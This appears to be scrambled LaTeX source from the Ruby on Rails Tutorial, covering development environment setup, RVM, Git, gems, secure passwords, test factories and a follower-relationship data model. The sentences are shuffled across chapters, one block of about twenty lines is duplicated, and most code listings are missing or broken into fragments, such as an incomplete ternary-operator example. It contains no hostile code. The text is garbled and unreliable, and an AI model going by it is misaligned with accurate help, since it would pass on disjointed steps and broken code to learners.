We can choose any migration name we want, but it's convenient to end the name with \kode{to\_users}, since in this case Rails automatically constructs a migration to add columns to the \kode{users} table.
     else
(Compare this to the original generation of the \kode{users} table in Listing~\ref{code:generate_user_model}, which included the arguments \kode{name:string} and \kode{email:string}.)
By including \kode{password\_digest:string}, we've given Rails enough information to construct the entire migration for us, as seen in Listing~\ref{code:password_migration}.
       This is the home page for the
       sample application.
To use bcrypt in the sample application, we need to add the \kode{bcrypt} gem to our \kode{Gemfile} (Listing~\ref{code:bcrypt_ruby}).
Adding \kode{bcrypt-ruby} to the \kode{Gemfile}.
<span>
\kode{f.object} is \kode{@micropost}.
To pass the object to the partial, we use a hash with value equal to the object and key equal to the desired name of the variable in the partial, which is what this code accomplishes:
In other words, \kode{object: f.object} creates a variable called \kode{object} in the \kode{error\_messages} partial.
as shown in Listing~\ref{code:updated_error_messages_partial}.
We'll also take a more concrete look at the effects of adding \kode{has\_secure\_password} to the User model, including an examination of the important \kode{authenticate} method.
See the Rails Guide on the \href{http://guides.rubyonrails.org/active_record_querying.html}{Active Record Query Interface} for more on \kode{where} and the like.
We can add a secure password to a model using the built-in \kode{has\_secure\_password} method.
Unfortunately, returning a paginated feed doesn't work in this case.
Implement it and click on a pagination link to see why.
in Listing~\ref{code:micropost_partial_with_delete} and
In the \kode{correct\_user} before filter, note that we find microposts \emph{through} the association:
in Listing~\ref{code:a_test_for_invalid_submission}.
as seen in Listing~\ref{code:micropost_user_mismatch_test}.
as shown in Listing~\ref{code:micropost_create_image_upload}.
as shown in Listing~\ref{code:micropost_partial_image_display}.
in Listing~\ref{code:micropost_model_image}.
as shown in Listing~\ref{code:micropost_model_image_validation}.
as shown in Listing~\ref{code:carrier_wave_configuration}.
There are 10 kinds of people in the world: Those who like the ternary operator, those who don't, and those who don't know about it.
   if boolean?
   boolean? ?
You can also use the ternary operator to replace assignment:
   var = boolean? ?
Another common use is in a function's return value:
   def foo
    do_stuff
    boolean? ?
Since Ruby implicitly returns the value of the last expression in a function, here the \texttt{foo} method returns \texttt{"bar"} or \texttt{"baz"} depending on the value of \texttt{boolean?}.
A helper to wrap long words.
as shown in Listing~\ref{code:edit_tests_logged_in}.
in Listing~\ref{code:edit_update_wrong_user_tests}.
As a bonus, by using base64 strings specifically designed to be safe in URLs (as indicated by the name \kode{urlsafe\_base64}), we'll be able to use the same token generator to make account activation and password reset links in Chapter~\ref{cha:account_activation_and_password_resets}.
It's also worth noting that this chapter saw the last of the necessary gem installations.
In Chapter~\ref{cha:account_activation_and_password_resets}, we'll make \emph{sure} of email validity by adding a separate \emph{account activation} step to user signup.
in Listing~\ref{code:user_pages_spec} and
in Listing~\ref{code:initial_signup_test}.
A recap of the initial User pages spec.
# Replace with code to make a user variable
where we need to fill in the comment with the appropriate code.
It then tests that the  page content and title both contain the user's name.
In order to make the necessary User model object, we could use Active Record to create a user with \kode{User.create}, but experience shows that user \emph{factories} are a more convenient way to define user objects and insert them in the database.
We'll be using the factories generated by \href{http://github.com/thoughtbot/factory_girl}{Factory Girl}, a Ruby gem produced by the good people at \href{http://thoughtbot.com/}{thoughtbot}.
As with RSpec, Factory Girl defines a domain-specific language in Ruby, in this case specialized for defining Active Record objects.
The syntax is simple, relying on Ruby blocks and custom methods to define the attributes of the desired object.
For cases such as the one in this chapter, the advantage over Active Record may not be obvious, but we'll use more advanced features of factories in future chapters.
(Since Factory Girl is only needed in the tests, we've put it in the \kode{:test} group.)
Adding Factory Girl to the \kode{Gemfile}.
in Listing~\ref{code:user_factory}.
A factory to simulate User model objects.
By passing the symbol \kode{:user} to the \kode{factory} command, we tell Factory Girl that the subsequent definition is for a User model object.
in Listing~\ref{code:user_show_page_test}.
You should verify at this point that the test suite is red:
in Listing~\ref{code:name_title_and_heading}.
Adding a title and heading for the user profile page.
In Chapter~\ref{cha:account_activation_and_password_resets}, we'll make \emph{sure} of email validity by adding a separate \emph{account activation} step to user signup.
This means that we have to create a new \kode{app/views/shared} directory using \kode{mkdir} (Table~\ref{table:unix_command_line}):
In order to test the form submission, we need to issue a \texttt{POST} request to the \kode{users\_path} (Table~\ref{table:table-RESTful_users}), which we can do with the \kode{post} function:
In Chapter~\ref{cha:account_activation_and_password_resets}, we'll make \emph{sure} of email validity by adding a separate \emph{account activation} step to user signup.
in Listing~\ref{code:user_pages_spec} and
in Listing~\ref{code:initial_signup_test}.
A recap of the initial User pages spec.
# Replace with code to make a user variable
where we need to fill in the comment with the appropriate code.
It then tests that the  page content and title both contain the user's name.
In order to make the necessary User model object, we could use Active Record to create a user with \kode{User.create}, but experience shows that user \emph{factories} are a more convenient way to define user objects and insert them in the database.
We'll be using the factories generated by \href{http://github.com/thoughtbot/factory_girl}{Factory Girl}, a Ruby gem produced by the good people at \href{http://thoughtbot.com/}{thoughtbot}.
As with RSpec, Factory Girl defines a domain-specific language in Ruby, in this case specialized for defining Active Record objects.
The syntax is simple, relying on Ruby blocks and custom methods to define the attributes of the desired object.
For cases such as the one in this chapter, the advantage over Active Record may not be obvious, but we'll use more advanced features of factories in future chapters.
(Since Factory Girl is only needed in the tests, we've put it in the \kode{:test} group.)
Adding Factory Girl to the \kode{Gemfile}.
in Listing~\ref{code:user_factory}.
A factory to simulate User model objects.
By passing the symbol \kode{:user} to the \kode{factory} command, we tell Factory Girl that the subsequent definition is for a User model object.
in Listing~\ref{code:user_show_page_test}.
You should verify at this point that the test suite is red:
in Listing~\ref{code:name_title_and_heading}.
Adding a title and heading for the user profile page.
Note the presence of \texttt{https://} and a lock icon in the address bar of Figure~\ref{fig:signup_failure_mockup}, which indicate that SSL is working.
Finally, we'll add authorization methods to our actions to enforce a site security model.
By the way, if you have deployed your sample app to Heroku, you can see its environment using the \texttt{heroku} command, which provides its own (remote) console:
<n>  Ruby console for yourapp.herokuapp.com
  Gravatar is a free service that allows users to upload images and associate them with email addresses they control.
If your application does need to handle custom images or other file uploads, I recommend \href{https://github.com/thoughtbot/paperclip}{Paperclip} or \href{https://github.com/jnicklas/carrierwave}{CarrierWave}.
Weird, right? I don't get it either.
Welcome to the \href{http://www.railstutorial.org/ruby-on-rails-tutorial-book}{\emph{Ruby on Rails Tutorial}}.
The goal of this book is to be the best answer to the question, ``If I want to learn web development with \href{http://rubyonrails.org/}{Ruby on Rails}, where should I start?''
By the time you finish the \emph{Ruby on Rails Tutorial}, you will have all the skills you need to develop and deploy your own custom web applications with Rails.
You will also be ready to benefit from the many more advanced books, blogs, and screencasts that are part of the thriving Rails educational ecosystem.
Finally, since the \emph{Ruby on Rails Tutorial} uses Rails~4, the knowledge you gain here represents the state of the art in web development.
(\emph{Note}: The present volume is the Rails~4.0 \emph{version} of the book, which means that it has been revised to be compatible with Rails~4.0, but it is not yet a new \emph{edition} because the changes in Rails don't yet justify it.
From the perspective of an introductory tutorial, the differences between Rails~4.0 and the previous version, Rails~3.2, are slight.
Once the changes in Rails justify the effort, I plan to prepare a full new edition of the \emph{Rails Tutorial}, including coverage of topics such as \emph{Turbolinks} and \emph{Russian doll caching}, as well as some new aspects of RSpec, such as \emph{feature specs}.)
Diffs from the 2nd edition
This is a (nearly) comprehensive list of differences between the 2nd edition of the \emph{Ruby on Rails Tutorial} and the present version.
(The only really important one is the change to strong parameters; the others are all relatively minor.)
This list is presented for the convenience of those who read the 2nd edition (or are otherwise familiar with Rails~3.2) and want a summary of the diffs.
In what follows, each item includes a reference to a section or code listing with an example of the change in question.
It's worth emphasizing that the goal of this book is \emph{not} merely to teach Rails, but rather to teach \emph{web development with Rails}, which means acquiring (or expanding) the skills needed to develop software for the World Wide Web.
To accomplish this goal, the \emph{Ruby on Rails Tutorial} takes an integrated approach: you will learn Rails by example by building a substantial sample application from scratch.
We'll then create our first Rails application, called (appropriately enough) \kode{first\_app}.
In Chapter~\ref{cha:a_demo_app}, we'll make a second project, whose purpose is to demonstrate the basic workings of a Rails application.
The rest of the tutorial focuses on developing a single large \emph{sample application} (called \kode{sample\_app}), writing all the code from scratch.
The final sample application will bear more than a passing resemblance to a certain popular \href{http://twitter.com/}{social microblogging site}---a site which, coincidentally, was also originally written in Rails.
Though of necessity our efforts will focus on this specific sample application, the emphasis throughout the \emph{Rails Tutorial} will be on general principles, so that you will have a solid foundation no matter what kinds of web applications you want to build.
But be warned: they accomplish their amazing fifteen-minute feat using a feature called \emph{scaffolding}, which relies heavily on \emph{generated code}, magically created by the Rails \kode{generate} command.
Since its debut in 2004, Ruby on Rails has rapidly become one of the most powerful and popular frameworks for building dynamic web applications.
There are also many web development shops that specialize in Rails, such as \href{http://entp.com/}{ENTP}, \href{http://thoughtbot.com/}{thoughtbot}, \href{http://pivotallabs.com/}{Pivotal Labs}, and \href{http://hashrocket.com/}{Hashrocket}, plus innumerable independent consultants, trainers, and contractors.
The \emph{Rails Tutorial} contains integrated tutorials not only for Rails, but also for the underlying Ruby language, the RSpec testing framework, \href{http://en.wikipedia.org/wiki/HTML}{HTML}, \href{http://en.wikipedia.org/wiki/CSS}{CSS}, a small amount of \href{http://en.wikipedia.org/wiki/JavaScript}{JavaScript}, and even a little \href{http://en.wikipedia.org/wiki/SQL}{SQL}. This means that, no matter where you currently are in your knowledge of web development, by the time you finish this tutorial you will be ready for more advanced Rails resources, as well as for the more systematic treatments of the other subjects mentioned.
If you prefer to learn everything systematically from the ground up, or if you have never programmed before, then learning Ruby first might work well for you, and in this case I recommend \href{http://www.amazon.com/gp/product/1430223634}{\emph{Beginning Ruby}} by Peter Cooper.
On the other hand, many beginning Rails developers are excited about making \emph{web} applications, and would rather not slog through a 500-page book on pure Ruby before ever writing a single web page.
As noted in the introduction, the \emph{Rails Tutorial} uses test-driven development (also called test-first development), which in my view is the best way to develop Rails applications, but it does introduce a substantial amount of overhead and complexity.
"About"
This latter strategy involves creating the necessary test files (called \emph{specs}) and filling them with the test code \emph{exactly} as it appears in the book.
At the end of this process, no matter where you started, you should be ready for the many more intermediate-to-advanced Rails resources out there.
\href{http://railscasts.com/}{RailsCasts} by Ryan Bates: Excellent (mostly) free Rails screencasts
\href{http://mbsy.co/6VQ8l}{Code School}: Interactive programming courses
\href{http://guides.rubyonrails.org/}{Rails Guides}: Good topical and up-to-date Rails references
Windows users should understand that their systems will use the analogous angle prompt~\kode{>}:
C:\Sites> echo "hello, world"
On Unix systems, some commands should be executed with \kode{sudo}, which stands for ``substitute user do''
Rails comes with lots of commands that can be run at the command line.
My Rails Tutorial sample application, for instance, lives in
/Users/mhartl/rails_projects/sample_app
The root directory for any given app is known as the \emph{Rails root}, but this terminology is confusing and many people mistakenly believe that the ``Rails root'' is the root directory for Rails itself.
/Users/mhartl/rails_projects/sample_app/config
/Users/mhartl/rails_projects/sample_app/config/routes.rb
Some commands may produce errors depending on your system; rather than attempt the \href{http://en.wikipedia.org/wiki/Sisyphus}{Sisyphean} task of documenting all such errors in this tutorial, I will delegate to the ``Google the error message'' algorithm, which among other things is good practice for real-life software development.
=> {:success=>"It worked!", error: "It failed."}
If you run into any problems while following the tutorial, I suggest consulting the resources listed on the \href{http://railstutorial.org/help}{Rails Tutorial help page}
I think of Chapter 1 as the ``weeding out phase'' in law school---if you can get your dev environment set up, the rest is easy to get through.
 ---Bob Cavezza, \emph{Rails Tutorial} reader
It's time now to get going with a Ruby on Rails development environment and our first application.
There is quite a bit of overhead here, especially if you don't have extensive programming experience, so don't get discouraged if it takes a while to get started.
It's not just you; every developer goes through it (often more than once), but rest assured that the effort will be richly rewarded.
Considering various idiosyncratic customizations, there are probably as many development environments as there are Rails programmers, but there are at least two broad types: text editor/command line environments, and integrated development environments (IDEs).
Let's consider the latter first.
The most prominent Rails IDEs are \href{http://www.aptana.com/rails/}{RadRails} and \href{http://www.jetbrains.com/ruby/index.html}{RubyMine}.
I've heard especially good things about RubyMine, and one reader (David Loeffler) has assembled \href{https://github.com/perfectionist/sample_project/wiki}{notes on how to use RubyMine with this tutorial}
 If you're comfortable using an IDE, I suggest taking a look at the options mentioned to see what fits with the way you work.
Text editors and command lines
Calvin navigates to the profile of a second user, Thomas Hobbes (Figure~\ref{fig:page_flow_other_profile_follow_button_mockup}), clicking on the ``Follow'' button to follow that user.
Which combination you use depends on your tastes and your platform.
As of this writing, \href{http://www.sublimetext.com/3}{Sublime Text~3} is in beta.
I recommend trying the newest Sublime Text only if you really want to be on the bleeding edge.
The current user's profile.~\href{http://railstutorial.org/images/figures/page_flow_profile_mockup_bootstrap-full.png}{(full size)}
Sublime Text is heavily influenced by \href{http://macromates.com}{TextMate}, and in fact is compatible with most TextMate customizations, such as snippets and color schemes.
Finding a user to follow.~\href{http://railstutorial.org/images/figures/page_flow_user_index_mockup_bootstrap-full.png}{(full size)}
(TextMate, which is available only on OS~X, is still a good choice if you use a Mac.)
The profile of a user to follow, with a follow button.~\href{http://railstutorial.org/images/figures/page_flow_other_profile_follow_button_mockup_bootstrap-full.png}{(full size)}
The vi editor is one of the most ancient yet powerful weapons in the Unix arsenal, and Vim is ``vi improved''.
Sublime Text can be obtained commercially, whereas Vim can be obtained at no cost; both are industrial-strength editors, but in my experience Sublime Text is \emph{much} more accessible to beginners.
A profile with an unfollow button and incremented followers count.~\href{http://railstutorial.org/images/figures/page_flow_other_profile_unfollow_button_mockup_bootstrap-full.png}{(full size)}
On Linux, the default terminal is fine.
The Home page with status feed and incremented following count.~\href{http://railstutorial.org/images/figures/page_flow_home_page_feed_mockup_bootstrap-full.png}{(full size)}
On Windows, many users prefer to develop Rails applications in a virtual machine running Linux, in which case your command-line options reduce to the previous case.
If you decide to use Sublime Text, you might want to follow the optional setup instructions for \href{https://github.com/mhartl/rails_tutorial_sublime_text}{Rails Tutorial Sublime Text}
As we will see, there is a problem with this approach, and we'll learn how to fix it using \kode{has\_many through}.
(Such configuration settings can be fiddly and error-prone, so I mainly recommend them for more advanced users; Sublime Text is an excellent choice for editing Rails applications even without the advanced setup.)
A text editor/command line development environment.  \href{http://railstutorial.org/images/figures/editor_shell-full.png}{(full size)}
Although there are many web browsers to choose from, the vast majority of Rails programmers use Firefox, Safari, or Chrome when developing.
All three browsers include a built-in ``Inspect element'' feature available by right- (or control-)clicking on any part of the page.
A note about tools
We could call them \emph{following}, but that's ambiguous: in normal English, a ``following'' is the set of people following \emph{you}, i.e., your followers---exactly the opposite of the intended meaning.
In the process of getting your development environment up and running, you may find that you spend a \emph{lot} of time getting everything just right.
Although we will use ``following'' as a label, as in ``50 following, 75 followers'', we'll use ``followed users'' for the users themselves, with a corresponding \kode{user.followed\_users} array
The learning process for editors and IDEs is particularly long; you can spend weeks on Sublime Text or Vim tutorials alone.
The first edition of this book used the \kode{user.following} terminology, which even I found confusing at times.
If you're new to this game, I want to assure you that \emph{spending time learning tools is normal}.
Thanks to reader Cosmo Lee for convincing me to change the terminology and for offering suggestions on how to make it clearer.
Everyone goes through it.
Sometimes it is frustrating, and it's easy to get impatient when you have an awesome web app in your head and you \emph{just want to learn Rails already}, but have to spend a week learning some weird ancient Unix editor just to get started.
(I didn't follow his exact advice, though, so if it's still confusing he bears none of the blame.)
Practically all the software<n>in the world is either broken or very difficult to use.
Having developed the User model and the signup functionality, now is a good time to deploy the sample application to production.
Since \kode{user.followed\_users} should be an array of users, each row of the \kode{followed\_users} table would need to be a user, as identified by the \kode{followed\_id}, together with the \kode{follower\_id} to establish the association
So users dread software.
They've been trained that whenever they try to install something, or even fill out a form online, it's not going to work.
In addition, since each row is a user, we would need to include the user's other attributes, including the name, password, etc.
 ---Paul Graham, in \emph{Founders at Work} by Jessica Livingston
Now it's time to install Ruby and Rails.
I've done my best to cover as many bases as possible, but systems vary, and many things can go wrong during these steps.
Be sure to Google the error message or consult the \href{http://railstutorial.org/help}{Rails Tutorial help page} if you run into trouble.
To get the deployment to work, we first need to add a line forcing the use of SSL in production.
Install Rails
One way to find the proper abstraction is to consider how we might implement the act of \emph{following} in a web application.
Unless otherwise noted, you should use the exact versions of all software used in the tutorial, including Rails itself, if you want the same results.
Sometimes minor version differences will yield identical results, but you shouldn't count on this, especially with respect to Rails versions.
in Listing~\ref{code:ssl_in_production}.
The main exception is Ruby itself: 1.9.3 and 2.0.0 are virtually identical for the purposes of this tutorial, so feel free to use either one.
Rails Installer (Windows)
A user then \kode{has\_many :relationships}, and has many \kode{followed\_users} (or \kode{followers}) \emph{through} these relationships.
If you are using Windows, go to \href{http://railsinstaller.org/}{Rails Installer} and download the Rails Installer executable and view the excellent installation video.
Moreover, by considering \emph{reverse} relationships, we could use the \kode{follower\_id} column to extract an array of user's followers.
To make a \kode{followed\_users} array of users, it would be possible to pull out an array of \kode{followed\_id} attributes and then find the user for each one.
To fix this, I am currently working with Nic and Wayne to create a list of Rails Installers ordered by Rails version number.
As you might expect, though, Rails has a way to make this procedure more convenient, and the relevant technique is known as \kode{has\_many through}.
Install Git
Because its use is ubiquitous, you should install Git even at this early stage; I suggest following the installation instructions for your platform at the \href{http://www.git-scm.com/book/en/Getting-Started-Installing-Git}{Installing Git section of \emph{Pro Git}}.
This code automatically populates \kode{user.followed\_users} with an array of followed users.
(You might see some deprecation warnings at this point, which you should ignore.)
Install Ruby
Finally, we need to set up SSL on the remote server.
The next step is to install Ruby.
Configuring a production site to use SSL is painful and error-prone, and among other things it involves purchasing an \emph{SSL certificate} for your domain.
(This can be painful and error-prone, and I actually dread having to install new versions of Ruby, but unfortunately it's the cost of doing business.)
It's possible that your system already has Ruby installed.
Luckily, for an application running on a Heroku domain (such as the sample application), we can piggyback on Heroku's SSL certificate, a feature that is included automatically as part of the Heroku platform.
Try running
If you want to run SSL on a custom domain, such as \kode{example.com}, you'll have no choice but to endure some pain, which you can read about on \href{http://devcenter.heroku.com/articles/ssl}{Heroku's page on SSL}.
to see the version number.
(In particular, it won't work Ruby 1.8.7.)
You should feel free to visit the signup page and create a new user at this time.
This tutorial assumes that most readers are using Ruby~1.9.3 or 2.0.0, but Ruby 1.9.2 should work as well.
If you have trouble, try running
A model of followed users through user relationships.
As part of installing Ruby, if you are using OS~X or Linux I strongly recommend using \href{http://rvm.io/}{Ruby Version Manager (RVM)} or \href{https://github.com/sstephenson/rbenv}{rbenv}, which allow you to install and manage multiple versions of Ruby on the same machine.
To get started with the implementation, we first generate a Relationship model as follows:
(The \href{http://github.com/vertiginous/pik}{Pik} project accomplishes a similar feat on Windows.)
This is particularly important if you want to run different versions of Ruby or Rails on the same machine.
It's possible that this will generate a Relationship factory, which you should remove:
Unfortunately, RVM and rbenv can't be used on the same system simultaneously, and since I've been using RVM longer that's the one I use in this tutorial.
If you haven't used IRC before, I suggest you start by searching the web for ``irc client <your platform>''.
Two good native clients for OS~X are \href{http://colloquy.info/}{Colloquy} and \href{http://limechat.net/mac/}{LimeChat}.
As a prerequisite, OS~X users may need to install the Xcode developer tools.
To avoid the (huge) full installation, I recommend the much smaller \href{https://developer.apple.com/downloads/}{Command Line Tools for Xcode}
To get started with the Ruby installation, first \href{http://rvm.io/rvm/install/}{install RVM}:
(If you have RVM installed, you should run
to ensure that you have the latest version.)
You can then get Ruby set up by examining the requirements for installing it:
On my system, I had to install the following (using \href{http://mxcl.github.com/homebrew/}{Homebrew}, a package management system for OS~X):
On Linux, you can accomplish similar things with \kode{apt-get} or \kode{yum}.
I also had to install a \href{https://en.wikipedia.org/wiki/YAML}{YAML} library:
How detailed you want to make your tests is up to you; a suggested template appears in Listing~\ref{code:flash_test}.
Finally, I needed to tell RVM where OpenSSL was located when installing Ruby~2.0.0:
<wait a while>
in Listing~\ref{code:relationship_create_test}.
Testing Relationship creation and attributes.
Unfortunately, lots of things can go wrong along the way.
See the discussion on \href{http://stackoverflow.com/questions/5359558/when-to-use-rspec-let}{when to use let at Stack Overflow} for more information.
I've done my best to cover some of the most common cases, but the only general solution is web searches and determination.
We originally used instance variables both because instance variables are important to introduce early and because \kode{let} is a little more advanced.
After installing Ruby, you should configure your system for the other software needed to run Rails applications.
as shown in Listing~\ref{code:user_relationships_method_test}.
This typically involves installing \emph{gems}, which are self-contained packages of Ruby code.
Testing for the \kode{user.relationships} attribute.
Since gems with different version numbers sometimes conflict, it is often convenient to create separate \emph{gemsets}, which are self-contained bundles of gems.
For the purposes of this tutorial, I suggest creating a gemset called \kode{railstutorial\_rails\_4\_0}:
Using /Users/mhartl/.rvm/gems/ruby-2.0.0-p0 with gemset railstutorial_rails_4_0
(Incidentally, the inverse of \kode{underscore} is \kode{camelize}, which converts \kode{"camel\_case"} to \kode{"CamelCase"}.)
as shown in Listing~\ref{code:user_relationships_association}.
For more information on RVM, I also recommend taking a look at the article \href{http://strandcode.com/2013/07/11/ruby-version-manager-rvm-overview-for-rails-newbs/}{Ruby Version Manager (RVM) Overview for Rails Newbs}
If you've noticed that \kode{followed\_id} also identifies a user, and are concerned about the asymmetric treatment of followed and follower, you're ahead of the game.
Install RubyGems
Implementing the user/relationships \kode{has\_many} association.
RubyGems is a package manager for Ruby projects, and there are many useful libraries (including Rails) available as Ruby packages, or \emph{gems}.
Installing RubyGems should be easy once you install Ruby.
in Listing~\ref{code:relationships_belongs_to_test}.
In fact, if you have \href{http://rvm.io/rvm/install/}{installed RVM}, you already have RubyGems, since RVM includes it automatically:
If you don't already have it, you should \href{http://rubygems.org/pages/download}{download RubyGems}, extract it, and then go to the \kode{rubygems} directory and run the setup program:
Testing the user/relationships \kode{belongs\_to} association.
If you already have RubyGems installed, you should make sure your system uses the version used in this tutorial:
To write the application code, we define the \kode{belongs\_to} relationship as usual.
Rails infers the names of the foreign keys from the corresponding symbols (i.e., \kode{follower\_id} from \kode{:follower}, and \kode{followed\_id} from \kode{:followed}), but since there is neither a Followed nor a Follower model we need to supply the class name \kode{User}.
Freezing your system to this particular version will help prevent conflicts as RubyGems changes in the future.
The result is shown in Listing~\ref{code:relationship_belongs_to}.
When installing gems, by default RubyGems generates two different kinds of documentation (called ri and rdoc), but many Ruby and Rails developers find that the time to build them isn't worth the benefit.
Note that, unlike the default generated Relationship model, in this case only the \kode{followed\_id} is accessible.
(Many programmers rely on online documentation instead of the native ri and rdoc documents.)
Adding the \kode{belongs\_to} associations to the Relationship model.
in Listing~\ref{code:gemrc}.
in Listing~\ref{code:relationship_create_test} and
Creating a gem configuration file.
Here \kode{subl} is the command-line command to launch Sublime Text on OS~X, which you can set up using the \href{http://www.sublimetext.com/docs/2/osx_command_line.html}{Sublime Text~2 documentation for the OS~X command line}.
If you're on a different platform, or if you're using a different editor, you should replace this command as necessary (i.e., by double-clicking the application icon or by using an alternate command such as \kode{mate}, \kode{vim}, \kode{gvim}, or \kode{mvim}).
For brevity, throughout the rest of this tutorial I'll use \kode{subl} as a shorthand for ``open with your favorite text editor.''
Suppressing the ri and rdoc documentation in \kode{.gemrc}.
Once you've installed RubyGems, installing Rails should be easy.
We come now to the heart of the Relationship associations: \kode{followed\_users} and \kode{followers}.
This tutorial standardizes on Rails~4.0, which we can install as follows:
as shown in Listing~\ref{code:user_following_test}.
To check your Rails installation, run the following command to print out the version number:
A test for the \kode{user.followed\_users} attribute.
As of this writing, those differences are not relevant, but in the future, as the current Rails version diverges from the one used in this tutorial, these differences may become significant.
If you're running Linux, you might have to install a couple of other packages at this point:
By default, in a \kode{has\_many through} association Rails looks for a foreign key corresponding to the singular version of the association; in other words, code like
would assemble an array using the \kode{followed\_id} in the \kode{relationships} table.
Virtually all Rails applications start the same way, by running \kode{rails new} command.
Adding the User model \kode{followed\_users} association.
Running \kode{rails new} to generate a new application.
(This \kode{follow!}\ method should always work, so, as with \kode{create!}\ and \kode{save!}, we indicate with an exclamation point that an exception will be raised on failure.)
In the application code, the \kode{following?}\ method takes in a user, called \kode{other\_user}, and checks to see if a followed user with that id exists in the database; the \kode{follow!}\ method calls \kode{create!}\ through the \kode{relationships} association to create the following relationship.
The results appear in Listing~\ref{code:following_p_follow_bang}.
instead of the equivalent code
Whether to include the explicit \kode{self} is largely a matter of taste.
Of course, users should be able to unfollow other users as well as follow them, which leads to the somewhat predictable \kode{unfollow!}
Use `bundle show [gemname]` to see where a bundled<n>gem is installed.
as shown in Listing~\ref{code:user_unfollow_test}.
A test for unfollowing a user.
Unfollowing a user by destroying a user relationship.
The final piece of the relationships puzzle is to add a \kode{user.followers} method to go with \kode{user.followed\_users}.
Indeed, the technique is exactly the same as for user following, with the roles of \kode{follower\_id} and \kode{followed\_id} reversed.
A model for user followers using a reverse Relationship model.
Testing for reverse relationships.
As noted briefly in Section~\ref{sec:the_first_application}, Bundler is run automatically (via \kode{bundle install}) by the \kode{rails} command, but in this section we'll make some changes to the default application gems and run Bundler again.
Notice how we switch subjects using the \kode{subject} method, replacing \kode{@user} with \kode{other\_user}, allowing us to test the follower relationship in a natural way:
This involves opening the \kode{Gemfile} with your favorite text editor:
As you probably suspect, we will not be making a whole database table just to hold reverse relationships.
Instead, we will exploit the underlying symmetry between followers and followed users to simulate a \kode{reverse\_relationships} table by passing \kode{followed\_id} as the primary key.
The default \kode{Gemfile} in the \kode{first\_app} directory.
In other words, where the \kode{relationships} association uses the \kode{follower\_id} foreign key,
the \kode{reverse\_relationships} association uses \kode{followed\_id}:
as shown in Listing~\ref{code:user_reverse_relationships}.
Implementing \kode{user.followers} using reverse relationships.
Note that we actually have to include the \emph{class} name for this association, i.e.,
because otherwise Rails would look for a \kode{ReverseRelationship} class, which doesn't exist.
It's also worth noting that we could actually omit the \kode{:source} key in this case, using simply
since, in the case of a \kode{:followers} attribute, Rails will singularize ``followers'' and automatically look for the foreign key \kode{follower\_id} in this case.
I've kept the \kode{:source} key to emphasize the parallel structure with the \kode{has\_many :followed\_users} association, but you are free to leave it off.
This section has placed rather heavy demands on your data modeling skills, and it's fine if it takes a while to soak in.
In fact, one of the best ways to understand the associations is to use them in the web interface, as seen in the next section.
# gem 'capistrano', group: :development
Unless you specify a version number to the \kode{gem} command, Bundler will automatically install the latest version of the gem.
As in previous chapters, we will find it convenient to use the sample data Rake task to fill the database with sample relationships.
(If you are using a version of Ruby other than 2.0.0, you should change the Ruby version line accordingly.)
The updated \kode{Gemfile} also changes the line for jQuery, the default JavaScript library used by Rails, from
We've also changed
make_users
make_microposts
make_relationships
This step is necessary only if you've changed the version of the Rails gem, which would likely happen only if you're using Rails Installer, but it does no harm to run it in other cases as well.
Here the sample relationships are created using the code
We somewhat arbitrarily arrange for the first user to follow users~3 through 51, and then have users 4 through 41 follow that user back.
Thanks to running \kode{rails new} in Section~\ref{sec:the_first_application} and \kode{bundle install} in Section~\ref{sec:bundler}, we already have an application we can run---but how?
Happily, Rails comes with a command-line program, or \emph{script}, that runs a \emph{local} web server, visible only from your development machine
Now that our sample users have both followed user and followers arrays, we need to update the profile page and Home page to reflect this.
=> Call with -d to detach
We'll next add a follow/unfollow form, and then make dedicated pages for showing user followed users and followers.
(If your system complains about the lack of a JavaScript runtime, visit the \href{https://github.com/sstephenson/execjs}{execjs page at GitHub} for a list of possibilities.
I particularly recommend installing \href{http://nodejs.org/}{Node.js}.)
Normally, websites run on port 80, but this usually requires special privileges, so Rails picks a less restricted higher-numbered port for the development server.
This address tells the computer to listen on every available IP address configured on that specific machine; in particular, we can view the application using the special address \kode{127.0.0.1}, which is also known as \kode{localhost}.
To see information about our first application, click on the link ``About your application's environment''.
The result is shown in Figure~\ref{fig:riding_rails_environment}.
Since both pages will be showing data, we use \kode{get} to arrange for the URLs to respond to \texttt{GET} requests (as required by the REST convention for such pages), and the \kode{member} method means that the routes respond to URLs containing the user id.
We'll remove the default page (and replace it with a custom home page) in Section~\ref{sec:rails_routes}.
With the routes defined, we are now in a position to make tests for the stats partial.
Now that we have a fresh and working Rails application, we'll take a moment for a step that, while technically optional, would be viewed by many Rails developers as practically essential, namely, placing our application source code under \emph{version control}.
(We could have written the tests first, but the named routes would have been hard to motivate without the updated routes file.)
Testing the following/follower statistics on the Home page.
Knowing how to use a version control system is a required skill for every software developer.
Git is a large subject, and we'll only be scratching the surface in this book, but there are many good free resources online; I especially recommend \href{http://git-scm.com/book}{\emph{Pro Git}} by Scott Chacon (Apress, 2009).
<n>        end
(As noted in that section, this involves following the instructions in the \href{http://git-scm.com/book/en/getting-started-installing-git}{Installing Git section of \emph{Pro Git}}.)
After installing Git, you should perform a set of one-time setup steps.
The core of this test is the expectation that the following and follower counts appear on the page, together with the right URLs:
I also like to use \kode{co} in place of the more verbose \kode{checkout} command, which we can arrange as follows:
This tutorial will usually use the full \kode{checkout} command, which works for systems that don't have \kode{co} configured, but in real life I nearly always use \kode{git co}.
Also note that in this case the word ``followers'' is acting as a \emph{label}, so we keep it plural even when there is only one follower.
as shown in Listing~\ref{code:stats_partial}.
Now we come to some steps that are necessary each time you create a new \emph{repository}.
Initialized empty Git repository in /Users/mhartl/rails_projects/first_app/.git/
The next step is to add the project files to the repository.
The result appears in Figure~\ref{fig:home_page_follow_stats}.
This command adds the project files to a \emph{staging area}, which contains pending changes to your project; you can see which files are in the staging area using the \kode{status} command
The Home page (\href{http://localhost:3000/}{/}) with follow stats.~\href{http://railstutorial.org/images/figures/home_page_follow_stats_bootstrap-full.png}{(full size)}
as seen in Listing~\ref{code:relationships_resource}.
This is in contrast to the popular open-source version control system called Subversion, in which a commit necessarily makes changes on a remote repository.
Git divides a Subversion-style commit into its two logical pieces: a local recording of the changes (\kode{git commit}) and a push of the changes up to a remote repository (\kode{git push}).
Date:   Thu Oct 15 11:36:21 2009 -0700
To exit \kode{git log}, you may have to type \kode{q} to quit.
It's probably not entirely clear at this point why putting your source under version control does you any good, so let me give just one example.
(We'll see many others in the chapters ahead.)
The ``hidden'' \kode{input} tag puts the relevant information on the page without displaying it in the browser.
Suppose you've made some accidental changes, such as (D'oh!) deleting the critical \kode{app/controllers/} directory:
Here we're using the Unix \kode{ls} command to list the contents of the \kode{app/controllers/} directory and the \kode{rm} command to remove it.
Let's check the status to see what's up:
